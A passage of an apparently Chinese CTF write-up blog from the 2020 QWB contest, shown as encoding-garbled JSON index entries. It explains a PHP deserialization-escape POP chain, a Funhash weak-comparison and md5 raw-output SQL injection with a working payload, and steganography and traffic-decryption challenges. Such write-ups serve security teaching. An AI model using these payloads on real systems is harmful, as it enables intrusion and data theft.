ä¹Ÿæ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œæ£€æŸ¥ååºåˆ—åŒ–çš„æ•°æ®æ˜¯å¦å­˜åœ¨nameå­—æ®µã€‚å…¶å®çœ‹åˆ°è¿™é‡Œï¼Œå·²ç»å¯ä»¥å‘ç° write() ä¸ read() å­˜åœ¨ ååºåˆ—åŒ–é€ƒé€¸ çš„æ¼æ´ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆç®€å•å­¦ä¹ ä¸‹ ååºåˆ—åŒ–é€ƒé€¸ çš„çŸ¥è¯†ç‚¹ã€‚ é¦–å…ˆï¼ŒPHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šæ ¹æ®å˜é‡çš„ç±»å‹æ¥ç”Ÿæˆå˜é‡ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿˜ä¼šæ ¹æ®é•¿åº¦æ¥ç”Ÿæˆå­—ç¬¦ä¸²ã€‚è€Œå¦‚æœé•¿åº¦å€¼è¶…å‡ºäº†åé¢çš„å®šä¹‰çš„å­—ç¬¦ä¸²çš„è¯ï¼ŒPHP ä¼šç»§ç»­å‘åå–å†…å®¹ï¼Œç›´åˆ°å–æ»¡ç›¸åŒé•¿åº¦çš„å­—ç¬¦ã€‚è¿™æ ·è¯´çš„å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œä¸¾ä¸ªä¾‹å­æ¼”ç¤ºä¸€ä¸‹ï¼š \u003c?php class A{ public $name; public $age; public function __construct($name, $age){ $this-\u003ename = $name; $this-\u003eage = $age; } } $A = new A('xiaoming', 18); var_dump($A); echo '\u003chr\u003e'; $str = serialize($A); echo $str; echo '\u003chr\u003e'; $str = substr_replace($str,'26',24,1); $str .= '\";s:3:\"age\";s:8:\"xiaoming\";}'; echo $str; echo '\u003chr\u003e'; var_dump( unserialize($str)); ?\u003e æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š \" æˆ‘ä»¬æœ€åˆå®šä¹‰name = 'xiaoming'ï¼Œage = 18ï¼Œåœ¨ç»è¿‡åºåˆ—åŒ–å¹¶å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œäº†æ”¹å˜ï¼Œå†æ¬¡ååºåˆ—åŒ–å›æ¥çš„æ—¶å€™å€¼éƒ½è¢«æ”¹å˜äº†ï¼Œç‰¹åˆ«æ˜¯ageï¼Œè¿ç±»å‹éƒ½æ”¹å˜äº†ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ åœ¨è¾“å‡ºçš„ç¬¬ä¸‰è¡Œä¸­ï¼Œå¯ä»¥çœ‹åˆ°s:8è¢«æ”¹æˆäº†s:26ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™ä»£è¡¨nameæˆå‘˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯ 26ã€‚ å½“ PHP æ”¶åˆ°ä¿®æ”¹åçš„æ•°æ®åï¼Œè¯»å–åˆ° 26 æ—¶ï¼Œå°±çœŸçš„ä¼šä»¥ 26 çš„é•¿åº¦å»è¯»å–å†…å®¹èµ‹å€¼ç»™ nameæˆå‘˜ï¼Œæ‰€ä»¥è¯´æœ€ånameå˜æˆäº†xiaoming\";s:3:\"age\";i:18;}ï¼Œå°†ä¹‹å‰çš„ageçš„å®šä¹‰å½“æˆäº†nameçš„å€¼ã€‚è€Œè¯»å–äº†nameçš„å†…å®¹ä¹‹åï¼ŒPHP ä¼šç»§ç»­ååºåˆ—åŒ–ï¼Œè¯»å–åˆ°æˆ‘ä»¬è‡ªå·±æ„é€ çš„æ•°æ®ï¼Œäºæ˜¯å°†ageèµ‹å€¼æˆäº†xiaomingã€‚ å†æ¬¡å›è¿‡å¤´æ¥çœ‹ write() ä¸ read()ï¼Œå®ƒä»¬çš„å†…å®¹ä¸­éƒ½æœ‰\\0*\\0ä¸0x00*0x00ï¼Œè¿™ä¸¤æ®µå­—ç¬¦ä¸²çš„åŒºåˆ«æ˜¯é•¿åº¦ä¸åŒï¼Œ\\0*\\0é•¿åº¦ä¸º 5ï¼Œè€Œ0x00*0x00é•¿åº¦ä¸º 3ï¼Œå¯ç”¨å¦‚ä¸‹ä»£ç åšä¸ªå®éªŒï¼š \u003c?php echo strlen($_GET['a']); echo '\u003cbr /\u003e'; echo strlen($_GET['b']); ?\u003e è®¿é—®?a=\\0*\\0\u0026b=%00*%00å¾—åˆ°ç»“æœå¦‚ä¸‹ï¼š \" è€Œread()å°†\\0*\\0æ›¿æ¢æˆ0x00*0x00ï¼Œé‚£ä¹ˆæ›¿æ¢åçš„å­—ç¬¦ä¸²ä¼šæ¯”åŸå­—ç¬¦ä¸²å°‘2ä¸ªå­—ç¬¦ï¼Œäºæ˜¯äº§ç”Ÿäº†æ¼æ´ã€‚è¿™é‡Œä¸ºäº†è¯´å¾—æ¸…æ¥šä¸€äº›ï¼Œç”¨playeræ¥åšä¸ªå®éªŒï¼š \u003c?php @error_reporting(0); require_once \"common.php\"; require_once \"class.php\"; $player = new player($_GET['a'], $_GET['b']); $ser = serialize($player); echo $ser; // åºåˆ—åŒ–æ—¶ echo '\u003cbr /\u003e\u003chr\u003e'; $ser = write($ser); echo $ser; // writeæ—¶ echo '\u003cbr /\u003e\u003chr\u003e'; $ser = read($ser); echo $ser; // readæ—¶ echo '\u003cbr /\u003e\u003chr\u003e'; var_dump( unserialize($ser)); // ååºåˆ—åŒ–æ—¶ echo '\u003cbr /\u003e\u003chr\u003e'; ?\u003e è®¿é—®?a=\\0*\\0\u0026b=123ï¼Œå¦‚ä¸‹ï¼š \" åœ¨åºåˆ—åŒ–æ—¶ï¼Œuserå‚æ•°çš„å€¼ä¸º\\0*\\0ï¼Œé•¿åº¦ä¸º5ï¼Œè€Œç»è¿‡write()æ–¹æ³•åï¼Œuserå‚æ•°çš„å€¼å’Œé•¿åº¦æœªå‘ç”Ÿä»»ä½•å˜åŒ–ï¼Œå› ä¸ºå€¼ä¸­ä¸åŒ…å«0x00*0x00ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡Œæ›¿æ¢ã€‚ è€Œåœ¨ç»è¿‡read()åï¼Œå› ä¸ºuserå‚æ•°çš„å€¼ä¸­åŒ…å«\\0*\\0ï¼Œäºæ˜¯å€¼è¢«æ›¿æ¢æˆäº†0x00*0x00ï¼Œä½†é•¿åº¦å¹¶æ²¡æœ‰æ”¹å˜ï¼Œä¾ç„¶è¿˜æ˜¯5ï¼ŒPHP ä¼šä»¥ 5 çš„é•¿åº¦æ¥è¯»å–å­—ç¬¦ä¸²ï¼Œä½†å®é™…ä¸Š0x00*0x00çš„é•¿åº¦åªæœ‰ 3ï¼Œäºæ˜¯ PHP ç»§ç»­å‘åè¯»å–ï¼ŒæŠŠ\";ä¹Ÿå½“æˆäº†å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åç»§ç»­ååºåˆ—åŒ–ï¼Œå› ä¸º\"è¢«å½“æˆäº†å­—ç¬¦ä¸²ï¼Œåé¢æ²¡æœ‰\"äº†ï¼Œå¯¼è‡´é—­åˆå¤±è´¥ï¼Œæœ€ç»ˆååºåˆ—åŒ–å¤±è´¥ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥åƒä¹‹å‰çš„ä¾‹å­ä¸€æ ·ï¼Œé é•¿åº¦ä¸ä¸€è‡´çš„é—®é¢˜ï¼ŒæŠŠååºåˆ—åŒ–ä¸­åŸæœ¬çš„å¯¹è±¡ä¿¡æ¯ç»™å½“æˆå­—ç¬¦ä¸²ï¼Œè€Œè‡ªå·±å†æ„é€ ç›¸åº”çš„æ•°æ®ï¼Œæ¥è¾¾åˆ°ä¿®æ”¹å¯¹è±¡ä¸­å…¶ä»–æˆå‘˜å˜é‡çš„å€¼ã€‚ æœ€åæ€»ç»“ä¸‹ä¸Šé¢çš„åˆ†æï¼š è·å–flagï¼Œéœ€è¦é€šè¿‡POPé“¾ åœ¨play.phpæ–‡ä»¶ä¸­ï¼Œååºåˆ—åŒ–playerç±»å¯¹è±¡æ—¶å­˜åœ¨ååºåˆ—åŒ–é€ƒé€¸ï¼Œåˆ©ç”¨è¿™ç‚¹å¯ä»¥æ„é€ POPé“¾çš„ç±»ä¿¡æ¯ å—æ§åˆ¶çš„å‚æ•°ä¸ºplayerç±»å¯¹è±¡çš„userå’Œpassï¼Œåˆ©ç”¨usernameå‚æ•°æŠŠuseræˆå‘˜å¡«å……ä¸º\\0*\\0çš„å½¢å¼ï¼Œç”¨æ¥ååºåˆ—åŒ–é€ƒé€¸ï¼Œåˆ©ç”¨passwordçš„å‚æ•°æŠŠpassæˆå‘˜æ„é€ æˆPOPé“¾ç±»å¯¹è±¡ï¼Œç”¨æ¥è·å–flag ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œå…ˆæŠŠä¸Šé¢çš„POPé“¾çš„ååºåˆ—åŒ–ä¿¡æ¯ç”Ÿæˆå‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š O:6:\"player\":3:{s:7:\"0x00*0x00user\";s:3:\"aaa\";s:7:\"0x00*0x00pass\";O:7:\"topsolo\":1:{s:7:\"0x00*0x00name\";O:7:\"midsolo\":1:{s:7:\"0x00*0x00name\";O:6:\"jungle\":1:{s","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:2:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"å¼ºç½‘å…ˆé”‹â€”â€”Funhash è¿™é“é¢˜ä¸»è¦è€ƒçš„æ˜¯ PHP ä¸­ï¼Œå…³äºå¼±ç±»å‹æ¯”è¾ƒä¸ md5() ç›¸å…³çš„æ¼æ´ï¼Œå¦‚æœæ¥è§¦å¾—æ¯”è¾ƒå¤šçš„è¯ï¼Œä¸€ä¸‹å°±åº”è¯¥åšå‡ºæ¥äº†ï¼Œä¸‹é¢æœ‰ä¸¤ä¸ªå‚è€ƒé“¾æ¥ï¼Œå…‰çœ‹è¿™ä¸¤ä¸ªé“¾æ¥éƒ½èƒ½æŠŠé¢˜åšå‡ºæ¥ã€‚æˆ‘è¿™é‡Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™ä¸ªé¢˜ï¼Œæ‰€ä»¥è¿˜æ˜¯è®°å½•ä¸‹è¿‡ç¨‹ã€‚ æºç å¦‚ä¸‹ï¼š \u003c?php include 'conn.php'; highlight_file(\"index.php\"); //level 1 if ($_GET[\"hash1\"] != hash(\"md4\", $_GET[\"hash1\"])) { die('level 1 failed'); } //level 2 if($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3'])) { die('level 2 failed'); } //level 3 $query = \"SELECT * FROM flag WHERE password = '\" . md5($_GET[\"hash4\"],true) . \"'\"; $result = $mysqli-\u003equery($query); $row = $result-\u003efetch_assoc(); var_dump($row); $result-\u003efree(); $mysqli-\u003eclose(); ?\u003e é¦–å…ˆæ¥çœ‹level 1ï¼Œéœ€è¦hash1 ä¸ md4(hash1) ç›¸ç­‰ï¼Œçœ‹åˆ°è¿™é‡Œæˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯ä¸å¯èƒ½ï¼Œè¿™æœºç‡å¤ªå°äº†ï¼Œç„¶åè¿˜æ˜¯å†™äº†ä¸ªè„šæœ¬çˆ†ç ´äº†ä¸€æ™šä¸Šï¼Œä¸å‡ºæ„å¤–æ²¡æœ‰ç»“æœã€‚ç¬¬äºŒå¤©ï¼Œç½‘ä¸Šæœèµ„æ–™çš„æ—¶å€™ï¼Œæ‰å‘ç°è¿™é‡Œç”¨çš„åˆ¤æ–­æ˜¯!=ï¼Œç»“åˆ PHP çš„å¼±ç±»å‹æ¯”è¾ƒä¸€æœï¼Œæœç„¶è¿™é‡Œæœ‰çŒ«è…»ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œåªè¦æ»¡è¶³0e+æ•°å­—ï¼Œåé¢çš„æ•°å­—æ— è®ºæ€ä¹ˆå˜éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥åªéœ€è¦æ„é€ hash1æ˜¯0e+æ•°å­—çš„æ ¼å¼ï¼Œå¹¶ä¸”md4(hash1)çš„ç»“æœä¹Ÿæ˜¯0e+æ•°å­—çš„æ ¼å¼å³å¯ã€‚äºæ˜¯å†æ¬¡æ„é€ è„šæœ¬çˆ†ç ´ï¼Œè¿™é‡Œæ€è·¯æ­£ç¡®äº†ï¼Œä½†æ˜¯è„šæœ¬æ„é€ çš„æœ‰é—®é¢˜ï¼Œå¦‚ä¸‹ï¼š import hashlib import string import itertools from Crypto.Hash import MD4 data = string.digits string.ascii_letters for i in range(1,33): for i in itertools.product(data,repeat=i): str = bytes(\"\".join(('0e',)+i),'utf8') h = MD4.new() h.update(str) md4str = h.hexdigest() if md4str.startswith('0e') and md4str.isnumeric(): print('it\\'s find!') print('str:%s, md5str:%s'%(str, md4str)) exit() æˆ‘è¿™é‡Œæƒ³çš„æ˜¯æ„é€  1 ~ 32 ä½çš„å­—ç¬¦ï¼Œä¾æ¬¡æ…¢æ…¢å¢åŠ ä½æ•°çˆ†ç ´ï¼Œç±»ä¼¼äºç¬›å¡å°”ç§¯çš„æ¨¡å¼ï¼Œå…¶å®è¿™æ ·æ€è·¯æ²¡æœ‰é—®é¢˜ï¼Œæœ€åè‚¯å®šæ˜¯èƒ½çˆ†ç ´å‡ºæ¥çš„ï¼Œåªæ˜¯æ—¶é—´æœ‰ç‚¹é•¿ï¼Œåœ¨è¿™é‡Œç­‰äº†å‡ ä¸ªå°æ—¶ï¼Œå‘ç°æ²¡æœ‰ç»“æœï¼Œä»¥ä¸ºè‡ªå·±çš„æ€è·¯æœ‰é—®é¢˜ï¼Œäºæ˜¯å’¨è¯¢äº†ä¸‹å¤§ä½¬ï¼Œå¤§ä½¬ä¸¢äº†ä¸ªè„šæœ¬è¿‡æ¥ï¼Œå¦‚ä¸‹ï¼š import hashlib import re prefix = '0e' def breakit(): iters = 0 while 1: s = (prefix + str(iters)).encode('utf-8') hashed_s = hashlib.new('md4', s).hexdigest() iters = iters + 1 r = re.match('^0e[0-9]{30}', hashed_s) if r: print (\"[+] found! md4( {} ) ---\u003e {}\".format(s, hashed_s)) print (\"[+] in {} iterations\".format(iters)) exit(0) breakit() å¤§ä½¬çš„è„šæœ¬å°±æ˜¯ä» 1 å¼€å§‹ï¼Œä¾æ¬¡ +1ï¼Œç„¶ååŠ ä¸Šå‰ç¼€ 0e è¿›è¡Œçˆ†ç ´ã€‚è¿™æ ·çš„æ–¹å¼å…¶å®å¹¶ä¸ç®—å®Œç¾ï¼Œä¼šæ¼æ‰ä¸€äº›å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚01ã€‚ä¸è¿‡è¿™é“é¢˜çš„ç¡®æ˜¯å¾—è¿™æ ·åšï¼Œåœ¨è·‘äº† 10 å¤šåˆ†é’Ÿä¹‹åï¼Œå°±æ‰¾åˆ°ç»“æœäº†ï¼š image-20200823201411637 \" æ¥ç€å†æ¥çœ‹level 2ï¼Œåœ¨level 2ï¼Œæ²¡æœ‰ä½¿ç”¨åˆ°==ä¸!=ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ä¸Šé¢çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œåœ¨è¿™é‡Œç½‘ä¸Šæœç´¢äº†èµ„æ–™ï¼Œå¾—çŸ¥ PHP çš„md5()æ— æ³•å¤„ç†æ•°ç»„ï¼Œå½“æ„é€ hash2[]=1\u0026hash3[]=2ï¼Œå³å¯ç»•è¿‡è¿™é‡Œçš„åˆ¤æ–­ã€‚ æœ€åæ¥çœ‹level 3ï¼Œè¿™é‡Œæ˜¯æˆ‘ç¬¬ä¸€çœ¼çœ‹åˆ°é¢˜ç›®æ—¶è§‰å¾—æœ€éš¾çš„åœ°æ–¹ï¼Œå‰é¢ä¸¤ä¸ªéƒ½æ˜¯è¿›è¡Œæœ‰ç›®çš„çš„å“ˆå¸Œç¢°æ’ï¼Œè¿™é‡Œå®Œå…¨æ²¡æœ‰ç›®æ ‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘æ²¡æœ‰åšå‡ºæ¥ï¼Œæœ€åé—®äº†å¤§ä½¬ï¼Œå¤§ä½¬æé†’æˆ‘è¯´ PHP çš„ md5()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼Œä¼šäº§ç”Ÿæ¼æ´ã€‚æˆ‘æ‹¿ç€è¿™ä¿¡æ¯å»æœç´¢äº†ä¸‹ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„ä¿¡æ¯ï¼Œå¤§æ¦‚å°±æ˜¯å½“ md5()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯å“ˆå¸Œå€¼çš„16å­—ç¬¦çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¦‚ä¸‹ï¼š image-20200823192324995 \" ç¬¬ä¸€å¤„ï¼Œæ˜¯md5('b',false)çš„ç»“æœï¼Œè¿™é‡Œè¿”å›çš„å°±æ˜¯ 32 å­—èŠ‚çš„asciiå½¢å¼çš„å“ˆå¸Œå€¼ï¼Œè€Œç¬¬äºŒå¤„ï¼Œæ˜¯md5('b',true)çš„ç»“æœï¼Œå¯ä»¥çœ‹åˆ°å‰é¢å‡ ä¸ªå­—èŠ‚ä¸ç¬¬ä¸€å¤„æ˜¯ä¸€æ ·çš„ï¼Œç›¸å½“äºæ˜¯ç¬¬ä¸€å¤„çš„äºŒè¿›åˆ¶æ ¼å¼ã€‚åœ¨ç¬¬äºŒå¤„çš„å³è¾¹å¯ä»¥çœ‹åˆ°ï¼Œè¿™å‡ ä¸ªäºŒè¿›åˆ¶æ•°æ®ï¼Œè½¬åŒ–ä¸ºasciiç ä¹‹åï¼Œå˜æˆäº†'or'xxxï¼Œå¦‚æœå°†è¿™å‡ ä¸ªå­—ç¬¦ä¸é¡µé¢ä¸Šçš„SQLè¯­å¥æ‹¼æ¥çš„è¯ï¼Œå°±å½¢æˆäº†ä¸‹é¢çš„è¯­å¥ï¼š $query = \"SELECT * FROM flag WHERE password = '\" . \"'or'xxx\" . \"'\"; è€Œåœ¨MySQLä¸­ï¼Œoråé¢åªè¦ä¸ä¸º0ï¼Œå³ä¸ºçœŸï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºé€ æˆäº†SQLæ³¨å…¥ï¼Œäºæ˜¯å°±æ»¡è¶³äº†æŸ¥è¯¢æ¡ä»¶ï¼Œå¾—åˆ°äº†flagï¼Œå¦‚ä¸‹ï¼š image-20200823185538378 \" Payloadï¼š?hash1=0e251288019\u0026hash2[]=1\u0026hash3[]=2\u0026hash4=ffifdyop å‚è€ƒé“¾æ¥ï¼š https://blog.csdn.net/zz_Caleb/article/details/84947371 https://www.cnblogs.com/piaomiaohongchen/p/10659359.html ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:3:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"å¼ºç½‘å…ˆé”‹â€”â€”upload ä¸‹è½½é¢˜ç›®é™„ä»¶ï¼Œå¯çœ‹åˆ°æ˜¯ä¸€ä¸ªæ•°æ®åŒ…data.pcapngï¼Œç”¨Wiresharkæ‰“å¼€ï¼Œå¯çœ‹åˆ°éƒ½æ˜¯HTTPçš„æ•°æ®ï¼š image-20200823171355987 \" å³é”®è¿½è¸ªæµ ==\u003e TCPæµï¼Œåœ¨ç¬¬ 2 ä¸ªæµä¸­ï¼Œå¯çœ‹åˆ°ä¸Šä¼ äº†ä¸€å¼ åä¸ºsteghide.jpgçš„å›¾ç‰‡ï¼Œå¦‚ä¸‹ï¼š image-20200823171328459 \" å°†å›¾ç‰‡æ•°æ®æå–å‡ºæ¥ï¼Œä¿å­˜æˆå›¾ç‰‡æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š image-20200823172650758 \" ä»ä¸Šä¼ çš„æ•°æ®åŒ…é‡Œå¯çœ‹è§ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸ºsteghide.jpgï¼ŒçŒœæµ‹ä¸éšå†™å·¥å…·steghideæœ‰å…³ï¼Œäºæ˜¯ç”¨steghideæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼š image-20200823173123927 \" å‘ç°æœ‰å¯†ç ï¼Œéšæ‰‹ä¸€æµ‹123456ï¼Œå‘ç°å¯†ç æ­£ç¡®ï¼š image-20200823173238110 \" äºæ˜¯æå–flag.txtï¼Œå¾—åˆ°flagï¼š image-20200823173322237 \" å‚è€ƒé“¾æ¥ï¼šhttp://www.safe6.cn/article/102 ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:4:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"å¼ºç½‘å…ˆé”‹â€”â€”çº¢æ–¹è¾…åŠ© ä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶client.pyã€enc.pcapng å…ˆæ¥çœ‹client.pyï¼Œè¯¥è„šæœ¬å°±æ˜¯è¯»å–æ–‡ä»¶å¹¶ä¸”åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ï¼Œä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š image-20200824022220030 \" æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–æ¯ä¸€è¡Œæ•°æ® å‘é€Gåˆ°æœåŠ¡ç«¯ æ¥æ”¶ 4 å­—èŠ‚æœåŠ¡ç«¯å‘æ¥çš„æ•°æ® å°†æ¯ä¸€è¡Œæ•°æ®ã€æ¥æ”¶åˆ°çš„ 4 å­—èŠ‚æ•°æ®ã€è®¡æ•°å˜é‡ä¸€èµ·ä¼ é€’ç»™åŠ å¯†å‡½æ•°ï¼Œå¾—åˆ°ä¸¤ä¸ªå€¼ï¼Œdataä¸ºåŠ å¯†åçš„æ•°æ® å°†åˆšæ‰å¾—åˆ°çš„æ•°æ®å‘é€ç»™æœåŠ¡ç«¯ è·å– 4 å­—èŠ‚æœåŠ¡ç«¯å‘æ¥çš„æ•°æ®ï¼Œå¹¶ä¸è®¡æ•°å˜é‡è¿›è¡Œæ¯”è¾ƒ ä»ä¸Šé¢çš„æµç¨‹å¯ä»¥çœ‹åˆ°ï¼Œä¸æœåŠ¡ç«¯äº¤äº’çš„è¿‡ç¨‹æ˜¯å‘é€ ==\u003e æ¥æ”¶ ==\u003e å‘é€ ==\u003e å‘é€ ==\u003e æ¥æ”¶ ç°åœ¨å†æ¥çœ‹enc.pcapngï¼Œæ‰“å¼€ä¹‹åå³é”®é€‰æ‹©è¿½è¸ªæµ ==\u003e TCPæµï¼Œåœ¨ç¬¬ 2 ä¸ªæµä¸­å¯çœ‹åˆ°å¤§é‡åŠ å¯†åçš„æ•°æ®ï¼Œå¦‚ä¸‹ï¼š image-20200824022849106 \" å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å¾ˆå¤šGï¼Œå¯ä»¥åˆ¤æ–­è¿™å°±æ˜¯å‘é€çš„æ•°æ®åŒ…ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†æµæ˜¾ç¤ºä¸ºåŸå§‹æ•°æ®ï¼Œçœ‹å¾—æ›´æ¸…æ™°ï¼š image-20200824023035570 \" å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹å‡ºï¼Œè¿™å°±æ˜¯æ¯ä¸€æ¬¡å‘é€æ¥æ”¶çš„æ•°æ®æµï¼Œä¸ä¹‹å‰åˆ†æçš„è¿‡ç¨‹ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯å‘é€ ==\u003e æ¥æ”¶ ==\u003e å‘é€ ==\u003e å‘é€ ==\u003e æ¥æ”¶ï¼š image-20200824023322550 \" ç»è¿‡åˆ†æï¼ŒæœåŠ¡ç«¯å‘é€æ¥çš„æ•°æ®btimeä¸ºæ—¶é—´æˆ³ï¼Œè€Œpcountåˆ™æ˜¯å’Œè®¡æ•°å˜é‡ä¸€è‡´çš„å†…å®¹ æ¥ä¸‹æ¥å†æ¥åˆ†æåŠ å¯†å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š image-20200824023602505 \" å…¶ä¸­è¿”å›çš„boffsetæ˜¯offsetå˜é‡ä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œè¿™ä¸ªé€šè¿‡è§‚å¯Ÿæµé‡åŒ…ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œæ°¸è¿œéƒ½æ˜¯ä¸‰ä¸ªä¹‹ä¸­çš„ä¸€ä¸ªã€‚ encåˆ™æ˜¯å°†ä¸€å †ç®—å‡ºæ¥çš„å€¼ï¼Œåˆåœ¨ä¸€èµ·çš„ä¸œè¥¿ã€‚ åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯è¦çŸ¥é“å®ƒä¼ è¾“çš„å†…å®¹åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯åŠ å¯†å‡½æ•°çš„å½¢å‚dataï¼Œè€Œåœ¨åŠ å¯†å‡½æ•°çš„ 37 è¡Œè¿™é‡Œï¼Œå°†dataä¸€ä¸ªä¸€ä¸ªå–å‡ºæ¥ï¼Œè¿›è¡Œä¸€é¡¿å¼‚æˆ–å’Œæ¨¡ä¹‹åï¼Œå¾—åˆ°çš„ç»“æœç»™encå¹¶ä¼ é€ç»™æœåŠ¡ç«¯ã€‚ä¹Ÿå°±æ˜¯è¯´ç°åœ¨æˆ‘ä»¬æ‰‹ä¸Šæœ‰åŠ å¯†çš„æ•°æ®ï¼ŒåŠ å¯†çš„ç®—æ³•ï¼Œç°åœ¨éœ€è¦å†™å‡ºè§£å¯†ç®—æ³•ï¼Œæ¥å°†åŠ å¯†æ•°æ®ç»™è§£å¯†å‡ºæ¥ã€‚ é¦–å…ˆæ¥çœ‹åŠ å¯†å‡½æ•°çš„ 35 è¡Œï¼Œè¿™é‡Œæ˜¯encé¦–æ¬¡è¢«æ‰“åŒ…èµ‹å€¼ï¼Œè¿™å‡ ä¸ªå€¼æ˜¯è§£å¯†çš„å…³é”®ï¼Œè€Œä¸”è¿™å‡ ä¸ªå€¼æ²¡æœ‰è¢«åŠ å¯†ï¼Œå¯ä»¥ä»æ•°æ®ä¸­å¾—åˆ°ã€‚å…ˆæ¥çœ‹çœ‹è¿™ä¸ªæ‰“åŒ…çš„æ ¼å¼\u003cIIcBï¼Œ\u003cä»£è¡¨ç”¨å°ç«¯å­˜å‚¨ï¼ŒIä»£è¡¨intå‹ï¼Œå  4 å­—èŠ‚ï¼Œcä»£è¡¨charå‹ï¼Œå  1 å­—èŠ‚ï¼ŒBä»£è¡¨unsigned charï¼Œå  1 å­—èŠ‚ã€‚è€Œåœ¨ç¬¬ä¸€æ¬¡çš„æ•°æ®åŒ…ä¸­å°±å¯¹åº”å¦‚ä¸‹è¿™å‡ ä¸ªå­—èŠ‚ï¼š image-20200824024653953 \" è½¬æ¢å›æ¥çš„è¯å°±æ˜¯ï¼š enc = struct.pack(\"\u003cIIcB\", 0, 132, '0', 14) è€Œä¸‹é¢çš„åŠ å¯†å¾ªç¯å°±å˜æˆäº†è¿™æ ·ï¼š i = 0 for c in data: enc += chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) i = (i + 1) % 4 å…¶ä¸­çš„tä¹Ÿæ˜¯èƒ½ä»æ•°æ®åŒ…ä¸­æ‰¾åˆ°çš„ï¼Œæ‰€ä»¥æœ€åå°±åªå‰©cä¸çŸ¥é“ï¼Œä¹Ÿå°±æ˜¯dataçš„æ¯ä¸€ä¸ªå­—ç¬¦ä¸çŸ¥é“æ˜¯å•¥ã€‚ æ±‚cæ€ä¹ˆæ±‚å‘¢ï¼Œå› ä¸ºåŠ å¯†æ•°æ®åŒ…å·²ç»çŸ¥é“äº†ï¼Œæ‰€ä»¥å®ƒæ¯æ¬¡åŠ å¯†åçš„ç»“æœæ˜¯çŸ¥é“çš„ï¼Œä¾‹å¦‚ç¬¬ä¸€ä¸ªæ˜¯a4ï¼Œé‚£ä¹ˆchr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) = 0xa4ï¼Œåœ¨è¿™ç§è¡¨è¾¾å¼ä¸‹ï¼Œcçš„å€¼è‚¯å®šæ˜¯0 ~ 255ä¹‹é—´çš„ä¸€ä¸ªå€¼ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºå®ƒæ˜¯dataä¸­çš„å­—ç¬¦å•Šï¼Œè€Œdataæ˜¯å¯ä»¥æ˜¾ç¤ºçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å®ƒçš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯å¯æ˜¾ç¤ºçš„ï¼Œé‚£ä¹ˆå°±è‚¯å®šæ˜¯0 ~ 